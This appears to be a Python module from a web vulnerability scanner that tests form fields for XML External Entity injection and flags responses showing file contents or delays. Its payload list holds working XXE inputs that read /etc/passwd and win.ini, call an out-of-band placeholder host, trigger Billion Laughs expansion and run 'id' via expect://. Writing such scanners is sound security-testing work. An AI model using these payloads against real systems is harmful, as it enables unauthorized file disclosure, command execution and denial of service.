"""
XXE (XML External Entity) Scanner
Detects XML External Entity injection by submitting crafted XML payloads
that attempt to read local files via SYSTEM entities, trigger out-of-band
DNS lookups, or cause Billion-Laughs-style entity expansion.
"""
import re
from typing import TYPE_CHECKING

import httpx

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine

_XXE_PAYLOADS: list[tuple[str, str]] = [
    # (payload, description)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "SYSTEM entity file read (/etc/passwd)",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "SYSTEM entity file read (win.ini)",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://wscan-oob.example.invalid/xxe">%xxe;]><root/>',
        "OOB parameter entity DNS probe",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>',
        "Billion Laughs entity expansion DoS probe",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
        "PHP expect:// wrapper for OS command execution",
    ),
]

# Patterns that indicate a successful /etc/passwd read
_PASSWD_RE = re.compile(r"root:.*:0:0:", re.DOTALL)
_WIN_INI_RE = re.compile(r"\[(?:fonts|extensions|mci extensions|files)\]", re.IGNORECASE)
_EXPANSION_RE = re.compile(r"lollol|entity.*expanded|billion.*laugh", re.IGNORECASE)
_BASELINE_XML = '<?xml version="1.0"?><root>wscan_xxe_baseline</root>'


def _looks_like_xml_endpoint(field: dict) -> bool:
    """Heuristic: field name or type hints at XML input."""
    name = (field.get("name") or field.get("id") or "").lower()
    ftype = (field.get("type") or "text").lower()
    xml_hints = ("xml", "soap", "wsdl", "body", "data", "payload", "content", "request")
    return any(h in name for h in xml_hints) or ftype in ("hidden", "textarea")


class XXEScanner(BaseScanner):
    """XML External Entity injection scanner."""

    CHECK_TYPE = "xxe"
    SEVERITY = "high"

    def __init__(self, engine: "ScanEngine"):
        super().__init__(engine)
        self._checked_urls: set[str] = set()

    async def _post_xml(self, url: str, payload: str) -> tuple[str, int, float]:
        timeout = getattr(self.engine, "timeout", 15)
        headers = {"Content-Type": "application/xml"}
        if hasattr(self.engine, "auth_headers"):
            headers = self.auth_headers_for_url(url, headers)
        client_kwargs: dict = {
            "timeout": timeout,
            "follow_redirects": True,
            "headers": headers,
        }
        if hasattr(self.engine, "httpx_client_kwargs"):
            client_kwargs = self.engine.httpx_client_kwargs(**client_kwargs)
        elif getattr(self.engine, "proxy", ""):
            client_kwargs["proxy"] = getattr(self.engine, "proxy", "")
            client_kwargs["verify"] = False

        async with httpx.AsyncClient(**client_kwargs) as client:
            r = await client.post(
                url,
                content=payload,
            )
        return r.text, r.status_code, r.elapsed.total_seconds()

    def _classify(
        self,
        baseline_body: str,
        probe_body: str,
        elapsed: float,
        timeout: float,
        description: str,
    ) -> tuple[str, str, dict] | None:
        checks = [
            ("xxe_file_read", _PASSWD_RE, "/etc/passwd content"),
            ("xxe_file_read", _WIN_INI_RE, "win.ini content"),
            ("xxe_entity_expansion", _EXPANSION_RE, "entity expansion output"),
        ]
        for evidence_type, pattern, label in checks:
            baseline_match = pattern.search(baseline_body or "")
            probe_match = pattern.search(probe_body or "")
            if probe_match and not baseline_match:
                marker = probe_match.group(0)[:150]
                return (
                    evidence_type,
                    f"XXE: {label} reflected in response - {description}",
                    {"matched_marker": marker, "description": description},
                )

        if elapsed > timeout * 0.8 and "oob" in description.lower():
            return (
                "xxe_oob_timing",
                f"XXE: response delay suggests OOB lookup triggered - {description}",
                {"elapsed_seconds": elapsed, "description": description},
            )

        return None

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        if not _looks_like_xml_endpoint(field):
            return []

        field_name = field.get("name") or field.get("id") or f"field_{form_index}"
        findings: list[Finding] = []

        timeout = getattr(self.engine, "timeout", 15)
        try:
            baseline_body, _baseline_status, _baseline_elapsed = await self._post_xml(
                url, _BASELINE_XML
            )
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] xxe: baseline request failed on {url} ({field_name}): {exc}"
                )
            return []

        for payload, description in _XXE_PAYLOADS:
            await self.log_payload_test(field_name, payload, self.CHECK_TYPE, url)
            try:
                body, status_code, elapsed = await self._post_xml(url, payload)

            except Exception as exc:
                if self.monitor:
                    await self.monitor.emit_status(
                        f"[warn] xxe: request failed on {url} ({field_name}): {exc}"
                )
                continue

            classified = self._classify(
                baseline_body,
                body,
                elapsed,
                timeout,
                description,
            )

            if classified:
                evidence_type, evidence, evidence_details = classified
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=evidence,
                    pair={
                        "request": {"url": url, "method": "POST", "body": payload},
                        "response": {"status": status_code, "body": body[:2000]},
                    },
                    severity="high",
                    confidence="likely",
                    evidence_type=evidence_type,
                    evidence_details=evidence_details,
                )
                findings.append(finding)
                break  # one confirmed finding per field is enough

        return findings

    async def scan_page(self, url: str) -> list[Finding]:
        return []

    async def verify_finding(self, finding: Finding) -> bool | None:
        probe = next(
            (
                (payload, description)
                for payload, description in _XXE_PAYLOADS
                if payload == finding.payload
            ),
            None,
        )
        if not probe:
            return None

        payload, description = probe
        timeout = getattr(self.engine, "timeout", 15)
        try:
            baseline_body, _baseline_status, _baseline_elapsed = await self._post_xml(
                finding.url,
                _BASELINE_XML,
            )
            body, _status, elapsed = await self._post_xml(finding.url, payload)
        except Exception:
            return None

        classified = self._classify(
            baseline_body,
            body,
            elapsed,
            timeout,
            description,
        )
        return bool(classified and classified[0] == finding.evidence_type)
